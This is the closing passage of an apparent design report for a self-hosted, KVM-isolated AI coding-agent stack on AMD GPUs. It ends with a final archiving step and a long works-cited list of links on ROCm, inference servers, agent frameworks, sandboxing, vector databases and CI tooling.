6. **The Archive (ZFS/Gitea):** Upon success, the system creates a filesystem snapshot, commits the code to the local Git repository, and logs the execution trajectory for future fine-tuning.102

This architecture—modular, fiercely isolated, and mathematically bound by the limits of your hardware—is how you achieve domination. Build the execution environment in Go. Build the state machines in TypeScript. Enforce absolute KVM isolation.

*Execute.*

#### **Works cited**

> 1. AMD Radeon AI PRO R9700 Getting Started, accessed on March 25, 2026, [https://www.amd.com/content/dam/amd/en/documents/products/graphics/workstation/radeon-ai-pro-rocm-pytorch-guide.pdf](https://www.amd.com/content/dam/amd/en/documents/products/graphics/workstation/radeon-ai-pro-rocm-pytorch-guide.pdf)  
> 2. Radeon™ Software for Linux® 25.30.1 with ROCm 7.1.1 Release Notes - AMD, accessed on March 25, 2026, [https://www.amd.com/en/resources/support-articles/release-notes/RN-AMDGPU-UNIFIED-LINUX-25-30-1-ROCM-7-1-1.html](https://www.amd.com/en/resources/support-articles/release-notes/RN-AMDGPU-UNIFIED-LINUX-25-30-1-ROCM-7-1-1.html)  
> 3. Containers aren't a sandbox for AI agents - DEV Community, accessed on March 25, 2026, [https://dev.to/siddhantkcode/containers-arent-a-sandbox-for-ai-agents-215o](https://dev.to/siddhantkcode/containers-arent-a-sandbox-for-ai-agents-215o)  
> 4. How Every Major Tech Company Is Sandboxing AI Agents Differently - Medium, accessed on March 25, 2026, [https://medium.com/@earlperry562/how-every-major-tech-company-is-sandboxing-ai-agents-differently-f41b65f14d8a](https://medium.com/@earlperry562/how-every-major-tech-company-is-sandboxing-ai-agents-differently-f41b65f14d8a)  
> 5. How to sandbox AI agents in 2026: Firecracker, gVisor, runtimes & isolation strategies, accessed on March 25, 2026, [https://substack.com/home/post/p-187330720](https://substack.com/home/post/p-187330720)  
> 6. AI Agent Sandbox: How to Safely Run Autonomous Agents in 2026 - Firecrawl, accessed on March 25, 2026, [https://www.firecrawl.dev/blog/ai-agent-sandbox](https://www.firecrawl.dev/blog/ai-agent-sandbox)  
> 7. IDEsaster: A Novel Vulnerability Class in AI IDEs | MaccariTA, accessed on March 25, 2026, [https://maccarita.com/posts/idesaster/](https://maccarita.com/posts/idesaster/)  
> 8. AI Coding Agents Have a Dirty Secret, accessed on March 25, 2026, [https://www.youtube.com/watch?v=fol4fvf3Rn8](https://www.youtube.com/watch?v=fol4fvf3Rn8)  
> 9. The Dark Side of LLMs: Agent-based Attacks for Complete Computer Takeover - arXiv, accessed on March 25, 2026, [https://arxiv.org/html/2507.06850v3](https://arxiv.org/html/2507.06850v3)  
> 10. prompt\_embeds deserialization allows DoS and potential RCE - GitHub, accessed on March 25, 2026, [https://github.com/vllm-project/vllm/security/advisories/GHSA-mrw7-hf4f-83pf](https://github.com/vllm-project/vllm/security/advisories/GHSA-mrw7-hf4f-83pf)  
> 11. Remote Code Execution Vulnerability in vLLM Multi-Node Cluster Configuration - GitHub, accessed on March 25, 2026, [https://github.com/vllm-project/vllm/security/advisories/GHSA-9pcc-gvx5-r5wm](https://github.com/vllm-project/vllm/security/advisories/GHSA-9pcc-gvx5-r5wm)  
> 12. ShadowMQ: How Code Reuse Spread Critical Vulnerabilities Across the AI Ecosystem, accessed on March 25, 2026, [https://www.oligo.security/blog/shadowmq-how-code-reuse-spread-critical-vulnerabilities-across-the-ai-ecosystem](https://www.oligo.security/blog/shadowmq-how-code-reuse-spread-critical-vulnerabilities-across-the-ai-ecosystem)  
> 13. CVE-2024-37032: Ollama Path Traversal Vulnerability - SentinelOne, accessed on March 25, 2026, [https://www.sentinelone.com/vulnerability-database/cve-2024-37032/](https://www.sentinelone.com/vulnerability-database/cve-2024-37032/)  
> 14. CVE-2024-37032 - CVE Details & Analysis | SOCRadar Labs CVE Radar, accessed on March 25, 2026, [https://socradar.io/labs/app/cve-radar/CVE-2024-37032](https://socradar.io/labs/app/cve-radar/CVE-2024-37032)  
> 15. GPU hardware specifications - AMD ROCm documentation, accessed on March 25, 2026, [https://rocm.docs.amd.com/en/latest/reference/gpu-arch-specs.html](https://rocm.docs.amd.com/en/latest/reference/gpu-arch-specs.html)  
> 16. Our Experience with Asus AMD Radeon AI Pro R9700 Turbo - Efison Lisan Teknologi, accessed on March 25, 2026, [https://efisonlt.com/our-experience-with-asus-amd-radeon-ai-pro-r9700-turbo/](https://efisonlt.com/our-experience-with-asus-amd-radeon-ai-pro-r9700-turbo/)  
> 17. AMD ROCm 7.0: Built for Developers, Advancing Open Innovation, accessed on March 25, 2026, [https://www.amd.com/en/developer/resources/technical-articles/2025/amd-rocm-7-built-for-developers-ready-for-enterprises.html](https://www.amd.com/en/developer/resources/technical-articles/2025/amd-rocm-7-built-for-developers-ready-for-enterprises.html)  
> 18. LangChain Alternatives | IBM, accessed on March 25, 2026, [https://www.ibm.com/think/insights/langchain-alternatives](https://www.ibm.com/think/insights/langchain-alternatives)  
> 19. Agentic Systems Architecture: Why Node.js is the Backbone for AI Automation - Amplework, accessed on March 25, 2026, [https://www.amplework.com/blog/nodejs-for-ai-agentic-systems-architecture/](https://www.amplework.com/blog/nodejs-for-ai-agentic-systems-architecture/)  
> 20. Go is a good fit for agents | Hacker News, accessed on March 25, 2026, [https://news.ycombinator.com/item?id=44179889](https://news.ycombinator.com/item?id=44179889)  
> 21. AMDGPU - ArchWiki, accessed on March 25, 2026, [https://wiki.archlinux.org/title/AMDGPU](https://wiki.archlinux.org/title/AMDGPU)  
> 22. ilya-zlobintsev/LACT: Linux GPU Configuration And Monitoring Tool - GitHub, accessed on March 25, 2026, [https://github.com/ilya-zlobintsev/LACT](https://github.com/ilya-zlobintsev/LACT)  
> 23. How do I undervolt AMD GPU on Arch? : r/archlinux - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/archlinux/comments/1qbos11/how\_do\_i\_undervolt\_amd\_gpu\_on\_arch/](https://www.reddit.com/r/archlinux/comments/1qbos11/how_do_i_undervolt_amd_gpu_on_arch/)  
> 24. Undervolting and other tweaks AMD : r/linux\_gaming - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/linux\_gaming/comments/1j3xh6i/undervolting\_and\_other\_tweaks\_amd/](https://www.reddit.com/r/linux_gaming/comments/1j3xh6i/undervolting_and_other_tweaks_amd/)  
> 25. Linux GPU Overclocking Guide – GreenWithEnvy & CoreCtrl - YouTube, accessed on March 25, 2026, [https://www.youtube.com/watch?v=iUhht9sfG\_4](https://www.youtube.com/watch?v=iUhht9sfG_4)  
> 26. Undervolt / OC tuning on radeon? : r/linux\_gaming - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/linux\_gaming/comments/1dk0dsp/undervolt\_oc\_tuning\_on\_radeon/](https://www.reddit.com/r/linux_gaming/comments/1dk0dsp/undervolt_oc_tuning_on_radeon/)  
> 27. Getting to Know Your GPU: A Deep Dive into AMD SMI - ROCm™ Blogs, accessed on March 25, 2026, [https://rocm.blogs.amd.com/software-tools-optimization/amd-smi-overview/README.html](https://rocm.blogs.amd.com/software-tools-optimization/amd-smi-overview/README.html)  
> 28. AMDGPU reset when playing games\[especially in proton\] : r/archlinux - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/archlinux/comments/1hnzyag/amdgpu\_reset\_when\_playing\_gamesespecially\_in/](https://www.reddit.com/r/archlinux/comments/1hnzyag/amdgpu_reset_when_playing_gamesespecially_in/)  
> 29. ggml-org/llama.cpp: LLM inference in C/C++ - GitHub, accessed on March 25, 2026, [https://github.com/ggml-org/llama.cpp](https://github.com/ggml-org/llama.cpp)  
> 30. llama.cpp on ROCm installation, accessed on March 25, 2026, [https://rocm.docs.amd.com/projects/install-on-linux/en/latest/install/3rd-party/llama-cpp-install.html](https://rocm.docs.amd.com/projects/install-on-linux/en/latest/install/3rd-party/llama-cpp-install.html)  
> 31. 7900 XTX + ROCm: A Year Later. Llama.cpp vs vLLM Benchmarks (TB3 eGPU) - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/LocalLLaMA/comments/1q189os/7900\_xtx\_rocm\_a\_year\_later\_llamacpp\_vs\_vllm/](https://www.reddit.com/r/LocalLLaMA/comments/1q189os/7900_xtx_rocm_a_year_later_llamacpp_vs_vllm/)  
> 32. SGLang distributed inference with Mooncake - AMD ROCm documentation, accessed on March 25, 2026, [https://rocm.docs.amd.com/en/latest/how-to/rocm-for-ai/inference/benchmark-docker/sglang-distributed.html](https://rocm.docs.amd.com/en/latest/how-to/rocm-for-ai/inference/benchmark-docker/sglang-distributed.html)  
> 33. Beyond Porting: How vLLM Orchestrates High-Performance Inference on AMD ROCm, accessed on March 25, 2026, [https://blog.vllm.ai/2026/02/27/rocm-attention-backend.html](https://blog.vllm.ai/2026/02/27/rocm-attention-backend.html)  
> 34. AMD ROCm™ 7.0.2 Preview on Radeon™ and Ryzen™ for Linux® Release Notes, accessed on March 25, 2026, [https://www.amd.com/en/resources/support-articles/release-notes/RN-AMDGPU-LINUX-ROCM-7-0-2-PREVIEW.html](https://www.amd.com/en/resources/support-articles/release-notes/RN-AMDGPU-LINUX-ROCM-7-0-2-PREVIEW.html)  
> 35. vLLM in Production: A Security Hardening Guide for Enterprise Deployments - Medium, accessed on March 25, 2026, [https://medium.com/@michael.hannecke/vllm-in-production-a-security-hardening-guide-for-enterprise-deployments-56a9c2c213dd](https://medium.com/@michael.hannecke/vllm-in-production-a-security-hardening-guide-for-enterprise-deployments-56a9c2c213dd)  
> 36. GitHub - sgl-project/sglang: SGLang is a high-performance serving framework for large language models and multimodal models., accessed on March 25, 2026, [https://github.com/sgl-project/sglang](https://github.com/sgl-project/sglang)  
> 37. LLM distributed inference and PD disaggregation on AMD Instinct GPUs, accessed on March 25, 2026, [https://rocm.docs.amd.com/projects/ai-developer-hub/en/v7.0/notebooks/inference/SGlang\_PD\_Disagg\_On\_AMD\_GPU.html](https://rocm.docs.amd.com/projects/ai-developer-hub/en/v7.0/notebooks/inference/SGlang_PD_Disagg_On_AMD_GPU.html)  
> 38. SGLang distributed inference with MoRI - AMD ROCm documentation, accessed on March 25, 2026, [https://rocm.docs.amd.com/en/develop/how-to/rocm-for-ai/inference/benchmark-docker/sglang-mori-distributed.html](https://rocm.docs.amd.com/en/develop/how-to/rocm-for-ai/inference/benchmark-docker/sglang-mori-distributed.html)  
> 39. I just rewrote llama.cpp server in Rust (most of it at least), and made it scalable - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/rust/comments/1ml5ogd/i\_just\_rewrote\_llamacpp\_server\_in\_rust\_most\_of\_it/](https://www.reddit.com/r/rust/comments/1ml5ogd/i_just_rewrote_llamacpp_server_in_rust_most_of_it/)  
> 40. LocalAI is the open-source AI engine. Run any model - LLMs, vision, voice, image, video - on any hardware. No GPU required. · GitHub, accessed on March 25, 2026, [https://github.com/mudler/LocalAI](https://github.com/mudler/LocalAI)  
> 41. Ollama Remote Code Execution: Securing the Code That Runs LLMs | Sonar, accessed on March 25, 2026, [https://www.sonarsource.com/blog/ollama-remote-code-execution-securing-the-code-that-runs-llms/](https://www.sonarsource.com/blog/ollama-remote-code-execution-securing-the-code-that-runs-llms/)  
> 42. Vulnerability in Ollama AI Platform Raises Remote Code Execution Concerns - Medium, accessed on March 25, 2026, [https://medium.com/@cyberpromagazine/vulnerability-in-ollama-ai-platform-raises-remote-code-execution-concerns-d30adbcfbc1a](https://medium.com/@cyberpromagazine/vulnerability-in-ollama-ai-platform-raises-remote-code-execution-concerns-d30adbcfbc1a)  
> 43. Found an uncensored Qwen2.5 32B! : r/LocalLLaMA - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/LocalLLaMA/comments/1fmn0q4/found\_an\_uncensored\_qwen25\_32b/](https://www.reddit.com/r/LocalLLaMA/comments/1fmn0q4/found_an_uncensored_qwen25_32b/)  
> 44. dphn/Dolphin3.0-Llama3.1-8B - Hugging Face, accessed on March 25, 2026, [https://huggingface.co/dphn/Dolphin3.0-Llama3.1-8B](https://huggingface.co/dphn/Dolphin3.0-Llama3.1-8B)  
> 45. Qwen2.5: A Party of Foundation Models! | Qwen, accessed on March 25, 2026, [https://qwenlm.github.io/blog/qwen2.5/](https://qwenlm.github.io/blog/qwen2.5/)  
> 46. The 11 best open-source LLMs for 2025 - n8n Blog, accessed on March 25, 2026, [https://blog.n8n.io/open-source-llm/](https://blog.n8n.io/open-source-llm/)  
> 47. Best LLM for Coding - Vellum AI, accessed on March 25, 2026, [https://vellum.ai/best-llm-for-coding](https://vellum.ai/best-llm-for-coding)  
> 48. Best Open Source LLMs in 2025: Top Models for AI Innovation | TRG Datacenters, accessed on March 25, 2026, [https://www.trgdatacenters.com/resource/best-open-source-llms-2025/](https://www.trgdatacenters.com/resource/best-open-source-llms-2025/)  
> 49. Awesome-LLM: a curated list of Large Language Model - GitHub, accessed on March 25, 2026, [https://github.com/hannibal046/awesome-llm](https://github.com/hannibal046/awesome-llm)  
> 50. Models with LICENSE:LLAMA3 license - Hugging Face, accessed on March 25, 2026, [https://huggingface.co/models?license=license%3Allama3](https://huggingface.co/models?license=license:llama3)  
> 51. Top 10 open source LLMs for 2025 - NetApp Instaclustr, accessed on March 25, 2026, [https://www.instaclustr.com/education/open-source-ai/top-10-open-source-llms-for-2025/](https://www.instaclustr.com/education/open-source-ai/top-10-open-source-llms-for-2025/)  
> 52. Models | OpenRouter, accessed on March 25, 2026, [https://openrouter.ai/models](https://openrouter.ai/models)  
> 53. Comparing Open-Source AI Agent Frameworks - Langfuse, accessed on March 25, 2026, [https://langfuse.com/blog/2025-03-19-ai-agent-comparison](https://langfuse.com/blog/2025-03-19-ai-agent-comparison)  
> 54. Choosing a JavaScript Agent Framework - Mastra Blog, accessed on March 25, 2026, [https://mastra.ai/blog/choosing-a-js-agent-framework](https://mastra.ai/blog/choosing-a-js-agent-framework)  
> 55. LangGraph: Agent Orchestration Framework for Reliable AI Agents - LangChain, accessed on March 25, 2026, [https://www.langchain.com/langgraph](https://www.langchain.com/langgraph)  
> 56. JavaScript catches up: 4 modern frameworks for multi-agent LLM orchestration, accessed on March 25, 2026, [https://dev.to/kaibanjs/javascript-catches-up-4-modern-frameworks-for-multi-agent-llm-orchestration-51fn](https://dev.to/kaibanjs/javascript-catches-up-4-modern-frameworks-for-multi-agent-llm-orchestration-51fn)  
> 57. The Top 15 LangChain Alternatives in 2026 (Reviewed & Compared) - Vellum AI, accessed on March 25, 2026, [https://vellum.ai/blog/top-langchain-alternatives](https://vellum.ai/blog/top-langchain-alternatives)  
> 58. The Top 11 AI Agent Frameworks For Developers In September 2026 - Vellum AI, accessed on March 25, 2026, [https://vellum.ai/blog/top-ai-agent-frameworks-for-developers](https://vellum.ai/blog/top-ai-agent-frameworks-for-developers)  
> 59. What are the most reliable AI agent frameworks in 2025? : r/AI\_Agents - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/AI\_Agents/comments/1pc9pyd/what\_are\_the\_most\_reliable\_ai\_agent\_frameworks\_in/](https://www.reddit.com/r/AI_Agents/comments/1pc9pyd/what_are_the_most_reliable_ai_agent_frameworks_in/)  
> 60. Best 50+ Open Source AI Agents Listed - AIMultiple, accessed on March 25, 2026, [https://aimultiple.com/open-source-ai-agents](https://aimultiple.com/open-source-ai-agents)  
> 61. Top 7 AI Agent Orchestration Frameworks - KDnuggets, accessed on March 25, 2026, [https://www.kdnuggets.com/top-7-ai-agent-orchestration-frameworks](https://www.kdnuggets.com/top-7-ai-agent-orchestration-frameworks)  
> 62. Why Go is a good fit for agents - Hatchet, accessed on March 25, 2026, [https://hatchet.run/blog/go-agents](https://hatchet.run/blog/go-agents)  
> 63. The Blueprint to Autonomous AI Systems: Agentic Design Patterns Explained - Medium, accessed on March 25, 2026, [https://medium.com/@dummahajan/the-blueprint-to-autonomous-ai-systems-agentic-design-patterns-explained-10877627713a](https://medium.com/@dummahajan/the-blueprint-to-autonomous-ai-systems-agentic-design-patterns-explained-10877627713a)  
> 64. What are AI agents? Definition, examples, and types | Google Cloud, accessed on March 25, 2026, [https://cloud.google.com/discover/what-are-ai-agents](https://cloud.google.com/discover/what-are-ai-agents)  
> 65. Types of AI Agents: Definitions, Roles, and Examples | Databricks Blog, accessed on March 25, 2026, [https://www.databricks.com/blog/types-ai-agents-definitions-roles-and-examples](https://www.databricks.com/blog/types-ai-agents-definitions-roles-and-examples)  
> 66. Tested 5 agent frameworks in production - here's when to use each one : r/AI\_Agents, accessed on March 25, 2026, [https://www.reddit.com/r/AI\_Agents/comments/1oukxzx/tested\_5\_agent\_frameworks\_in\_production\_heres/](https://www.reddit.com/r/AI_Agents/comments/1oukxzx/tested_5_agent_frameworks_in_production_heres/)  
> 67. Best 10 AI Agent Frameworks for 2025 - Deepchecks, accessed on March 25, 2026, [https://deepchecks.com/best-ai-agent-frameworks/](https://deepchecks.com/best-ai-agent-frameworks/)  
> 68. Agentic Design Patterns. From reflection to collaboration… | by Bijit Ghosh - Medium, accessed on March 25, 2026, [https://medium.com/@bijit211987/agentic-design-patterns-cbd0aae2962f](https://medium.com/@bijit211987/agentic-design-patterns-cbd0aae2962f)  
> 69. Introducing CodeMender: an AI agent for code security - Google DeepMind, accessed on March 25, 2026, [https://deepmind.google/blog/introducing-codemender-an-ai-agent-for-code-security/](https://deepmind.google/blog/introducing-codemender-an-ai-agent-for-code-security/)  
> 70. These top 30 AI agents deliver a mix of functions and autonomy - ZDNET, accessed on March 25, 2026, [https://www.zdnet.com/article/top-30-ai-agents-offer-mixed-functionality-autonomy/](https://www.zdnet.com/article/top-30-ai-agents-offer-mixed-functionality-autonomy/)  
> 71. AI Agent Architecture Patterns: Single & Multi-Agent Systems - Redis, accessed on March 25, 2026, [https://redis.io/blog/ai-agent-architecture-patterns/](https://redis.io/blog/ai-agent-architecture-patterns/)  
> 72. What is an LLM agent? A developer's guide - Vercel, accessed on March 25, 2026, [https://vercel.com/i/llm-agent](https://vercel.com/i/llm-agent)  
> 73. Six Core Design Principles for Multi-AI Agent Systems | by Cobus ..., accessed on March 25, 2026, [https://cobusgreyling.medium.com/six-core-design-principles-for-multi-ai-agent-systems-857f5c32ec33](https://cobusgreyling.medium.com/six-core-design-principles-for-multi-ai-agent-systems-857f5c32ec33)  
> 74. Complete Prompt Engineering Guide: 15 AI Techniques for 2025, accessed on March 25, 2026, [https://www.dataunboxed.io/blog/the-complete-guide-to-prompt-engineering-15-essential-techniques-for-2025](https://www.dataunboxed.io/blog/the-complete-guide-to-prompt-engineering-15-essential-techniques-for-2025)  
> 75. Advanced Prompt Engineering Techniques for 2025: Beyond Basic Instructions - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/PromptEngineering/comments/1k7jrt7/advanced\_prompt\_engineering\_techniques\_for\_2025/](https://www.reddit.com/r/PromptEngineering/comments/1k7jrt7/advanced_prompt_engineering_techniques_for_2025/)  
> 76. The Complete Prompt Engineering Guide for 2025: Mastering Cutting-Edge Techniques | by Alonso Aguilar, accessed on March 25, 2026, [https://aloaguilar20.medium.com/the-complete-prompt-engineering-guide-for-2025-mastering-cutting-edge-techniques-dfe0591b1d31](https://aloaguilar20.medium.com/the-complete-prompt-engineering-guide-for-2025-mastering-cutting-edge-techniques-dfe0591b1d31)  
> 77. Advanced Prompt Engineering Techniques in 2025 - Maxim AI, accessed on March 25, 2026, [https://www.getmaxim.ai/articles/advanced-prompt-engineering-techniques-in-2025/](https://www.getmaxim.ai/articles/advanced-prompt-engineering-techniques-in-2025/)  
> 78. Top 5 Vector Databases to Use for RAG (Retrieval-Augmented Generation) in 2025, accessed on March 25, 2026, [https://apxml.com/posts/top-vector-databases-for-rag](https://apxml.com/posts/top-vector-databases-for-rag)  
> 79. Top 7 Open Source Vector Databases in 2025: A Comprehensive Guide for AI Engineers, accessed on March 25, 2026, [https://medium.com/@zimo-123/top-7-open-source-vector-databases-in-2025-a-comprehensive-guide-for-ai-engineers-a2a6b8a6138c](https://medium.com/@zimo-123/top-7-open-source-vector-databases-in-2025-a-comprehensive-guide-for-ai-engineers-a2a6b8a6138c)  
> 80. Best Vector Databases for RAG: Complete 2025 Comparison Guide - Latenode Blog, accessed on March 25, 2026, [https://latenode.com/blog/ai-frameworks-technical-infrastructure/vector-databases-embeddings/best-vector-databases-for-rag-complete-2025-comparison-guide](https://latenode.com/blog/ai-frameworks-technical-infrastructure/vector-databases-embeddings/best-vector-databases-for-rag-complete-2025-comparison-guide)  
> 81. Top 5 Vector Databases to Use in 2025 - GoCodeo, accessed on March 25, 2026, [https://www.gocodeo.com/post/top-5-vector-databases-to-use-in-2025](https://www.gocodeo.com/post/top-5-vector-databases-to-use-in-2025)  
> 82. The top 6 Vector Databases to use for AI applications in 2026 - Appwrite, accessed on March 25, 2026, [https://appwrite.io/blog/post/top-6-vector-databases-2025](https://appwrite.io/blog/post/top-6-vector-databases-2025)  
> 83. Which Vector DB should I use for production? : r/Rag - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/Rag/comments/1qlftqz/which\_vector\_db\_should\_i\_use\_for\_production/](https://www.reddit.com/r/Rag/comments/1qlftqz/which_vector_db_should_i_use_for_production/)  
> 84. Best Vector Databases in 2026: A Complete Comparison Guide - Firecrawl, accessed on March 25, 2026, [https://www.firecrawl.dev/blog/best-vector-databases](https://www.firecrawl.dev/blog/best-vector-databases)  
> 85. How can I efficiently run a RAG pipeline fully in Node.js using OpenAI embeddings and FAISS without relying on Python? - Stack Overflow, accessed on March 25, 2026, [https://stackoverflow.com/questions/79803694/how-can-i-efficiently-run-a-rag-pipeline-fully-in-node-js-using-openai-embedding](https://stackoverflow.com/questions/79803694/how-can-i-efficiently-run-a-rag-pipeline-fully-in-node-js-using-openai-embedding)  
> 86. Choosing the Right Node.js Job Queue - Judoscale, accessed on March 25, 2026, [https://judoscale.com/blog/node-task-queues](https://judoscale.com/blog/node-task-queues)  
> 87. BullMQ - Background Jobs and Message Queue for Node.js, Python, Elixir & more | BullMQ, accessed on March 25, 2026, [https://bullmq.io/](https://bullmq.io/)  
> 88. How to Build a Task Scheduler with BullMQ in Node.js - OneUptime, accessed on March 25, 2026, [https://oneuptime.com/blog/post/2026-01-26-task-scheduler-bullmq-nodejs/view](https://oneuptime.com/blog/post/2026-01-26-task-scheduler-bullmq-nodejs/view)  
> 89. Reliable Background Task Execution using BullMQ and Node.js - Twimbit, accessed on March 25, 2026, [https://twimbit.com/about/blogs/reliable-background-task-execution-using-bullmq-and-node-js](https://twimbit.com/about/blogs/reliable-background-task-execution-using-bullmq-and-node-js)  
> 90. Supercharging Go with Asynq: Scalable Background Jobs Made Easy - DEV Community, accessed on March 25, 2026, [https://dev.to/lovestaco/supercharging-go-with-asynq-scalable-background-jobs-made-easy-32do](https://dev.to/lovestaco/supercharging-go-with-asynq-scalable-background-jobs-made-easy-32do)  
> 91. hatchet-dev/hatchet: Run Background Tasks at Scale - GitHub, accessed on March 25, 2026, [https://github.com/hatchet-dev/hatchet](https://github.com/hatchet-dev/hatchet)  
> 92. Guide to Agenda for Queue Implementation in Node.js | by Usama Akbar - Medium, accessed on March 25, 2026, [https://medium.com/@UsamaHere/guide-to-agenda-for-queue-implementation-in-node-js-530bf51316a3](https://medium.com/@UsamaHere/guide-to-agenda-for-queue-implementation-in-node-js-530bf51316a3)  
> 93. bee-queue/bee-queue: A simple, fast, robust job/task queue for Node.js, backed by Redis. - GitHub, accessed on March 25, 2026, [https://github.com/bee-queue/bee-queue](https://github.com/bee-queue/bee-queue)  
> 94. How to sandbox AI agents in 2026: MicroVMs, gVisor & isolation strategies | Blog, accessed on March 25, 2026, [https://northflank.com/blog/how-to-sandbox-ai-agents](https://northflank.com/blog/how-to-sandbox-ai-agents)  
> 95. Firecracker vs gVisor: Which isolation technology should you use? | Blog - Northflank, accessed on March 25, 2026, [https://northflank.com/blog/firecracker-vs-gvisor](https://northflank.com/blog/firecracker-vs-gvisor)  
> 96. Choosing a Workspace for AI Agents: The Ultimate Showdown Between gVisor, Kata, and Firecracker - DEV Community, accessed on March 25, 2026, [https://dev.to/agentsphere/choosing-a-workspace-for-ai-agents-the-ultimate-showdown-between-gvisor-kata-and-firecracker-b10](https://dev.to/agentsphere/choosing-a-workspace-for-ai-agents-the-ultimate-showdown-between-gvisor-kata-and-firecracker-b10)  
> 97. Firecracker vs Docker: The Technical Boundary Between MicroVMs and Containers, accessed on March 25, 2026, [https://huggingface.co/blog/agentbox-master/firecracker-vs-docker-tech-boundary](https://huggingface.co/blog/agentbox-master/firecracker-vs-docker-tech-boundary)  
> 98. wrr/drop: productivity-focused sandboxing for Linux - GitHub, accessed on March 25, 2026, [https://github.com/wrr/drop](https://github.com/wrr/drop)  
> 99. Why would you use a microVM (Firecracker, Docker sandbox, nono, etc...) for sandboxing instead of just a Docker container? - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/AI\_Agents/comments/1rpblox/why\_would\_you\_use\_a\_microvm\_firecracker\_docker/](https://www.reddit.com/r/AI_Agents/comments/1rpblox/why_would_you_use_a_microvm_firecracker_docker/)  
> 100. Dual AMD Radeon 9700 AI PRO: Building a 64GB LLM/AI Server with Llama.cpp - YouTube, accessed on March 25, 2026, [https://www.youtube.com/watch?v=dgyqBUD71lg](https://www.youtube.com/watch?v=dgyqBUD71lg)  
> 101. How to Set Up a CI/CD Stack (Gitea + Drone) with Docker Compose - OneUptime, accessed on March 25, 2026, [https://oneuptime.com/blog/post/2026-02-08-how-to-set-up-a-cicd-stack-gitea-drone-with-docker-compose/view](https://oneuptime.com/blog/post/2026-02-08-how-to-set-up-a-cicd-stack-gitea-drone-with-docker-compose/view)  
> 102. Gitea + Drone for a Lightweight Self-Hosted CI/CD | by Rushikesh Mahindrakar | Medium, accessed on March 25, 2026, [https://medium.com/@rushikeshmahindrakar26/gitea-drone-for-a-lightweight-self-hosted-ci-cd-edd224c728b7](https://medium.com/@rushikeshmahindrakar26/gitea-drone-for-a-lightweight-self-hosted-ci-cd-edd224c728b7)  
> 103. Drone CI – Automate Software Testing and Delivery, accessed on March 25, 2026, [https://www.drone.io/](https://www.drone.io/)  
> 104. Best CI/CD Pipeline Tools You Should Know - CodiLime, accessed on March 25, 2026, [https://codilime.com/blog/best-ci-cd-pipeline-tools-you-should-know/](https://codilime.com/blog/best-ci-cd-pipeline-tools-you-should-know/)  
> 105. Self-hosted CI environment / pipelines? : r/selfhosted - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/selfhosted/comments/nx3lk1/selfhosted\_ci\_environment\_pipelines/](https://www.reddit.com/r/selfhosted/comments/nx3lk1/selfhosted_ci_environment_pipelines/)  
> 106. GitHub - SigNoz/signoz: SigNoz is an open-source observability platform native to OpenTelemetry with logs, traces and metrics in a single application. An open-source alternative to DataDog, NewRelic, etc. . Open source Application Performance Monitoring (APM) & Observability tool, accessed on March 25, 2026, [https://github.com/SigNoz/signoz](https://github.com/SigNoz/signoz)  
> 107. AI Observability - Grafana Cloud documentation, accessed on March 25, 2026, [https://grafana.com/docs/grafana-cloud/monitor-applications/ai-observability/](https://grafana.com/docs/grafana-cloud/monitor-applications/ai-observability/)  
> 108. Supercharge Your Open Source Observability: Aiden with Grafana, Prometheus, Loki, and Jaeger - StackGen, accessed on March 25, 2026, [https://stackgen.com/blog/supercharge-your-open-source-observability-aiden-with-grafana-prometheus-loki-and-jaeger](https://stackgen.com/blog/supercharge-your-open-source-observability-aiden-with-grafana-prometheus-loki-and-jaeger)  
> 109. AI Observability: Tools and Best Practices - Mirantis, accessed on March 25, 2026, [https://www.mirantis.com/blog/ai-observability/](https://www.mirantis.com/blog/ai-observability/)  
> 110. I built a self-hosted AI layer for observability - stores all your logs/metrics locally, query in plain English : r/devops - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/devops/comments/1phnwly/i\_built\_a\_selfhosted\_ai\_layer\_for\_observability/](https://www.reddit.com/r/devops/comments/1phnwly/i_built_a_selfhosted_ai_layer_for_observability/)  
> 111. "Self-Improving AI" AI & Human Co-Improvement for Safer Co-Superintelligence - arXiv, accessed on March 25, 2026, [https://arxiv.org/html/2512.05356v1](https://arxiv.org/html/2512.05356v1)  
> 112. confident-ai/deepeval: The LLM Evaluation Framework - GitHub, accessed on March 25, 2026, [https://github.com/confident-ai/deepeval](https://github.com/confident-ai/deepeval)  
> 113. Top 6 Open Source LLM Evaluation Frameworks : r/LLMDevs - Reddit, accessed on March 25, 2026, [https://www.reddit.com/r/LLMDevs/comments/1i6r1h9/top\_6\_open\_source\_llm\_evaluation\_frameworks/](https://www.reddit.com/r/LLMDevs/comments/1i6r1h9/top_6_open_source_llm_evaluation_frameworks/)  
> 114. Self-Evolving Agents - A Cookbook for Autonomous Agent Retraining - OpenAI Developers, accessed on March 25, 2026, [https://developers.openai.com/cookbook/examples/partners/self\_evolving\_agents/autonomous\_agent\_retraining](https://developers.openai.com/cookbook/examples/partners/self_evolving_agents/autonomous_agent_retraining)  
> 115. Beyond Git Worktrees: Isolated Playgrounds for Your LLM Coding Agents - Medium, accessed on March 25, 2026, [https://medium.com/@llupRisingll/the-quest-for-true-development-environment-isolation-on-linux-71dffbf23aad](https://medium.com/@llupRisingll/the-quest-for-true-development-environment-isolation-on-linux-71dffbf23aad)  
> 116. Performance of llama.cpp on AMD ROCm (HIP) \#15021 - GitHub, accessed on March 25, 2026, [https://github.com/ggml-org/llama.cpp/discussions/15021](https://github.com/ggml-org/llama.cpp/discussions/15021)  
> 117. Secret scanning in AI coding agents via the GitHub MCP Server, accessed on March 25, 2026, [https://github.blog/changelog/2026-03-17-secret-scanning-in-ai-coding-agents-via-the-github-mcp-server/](https://github.blog/changelog/2026-03-17-secret-scanning-in-ai-coding-agents-via-the-github-mcp-server/)  
> 118. Top 15 LangChain Alternatives for AI Development in 2024 - n8n Blog, accessed on March 25, 2026, [https://blog.n8n.io/langchain-alternatives/](https://blog.n8n.io/langchain-alternatives/)  
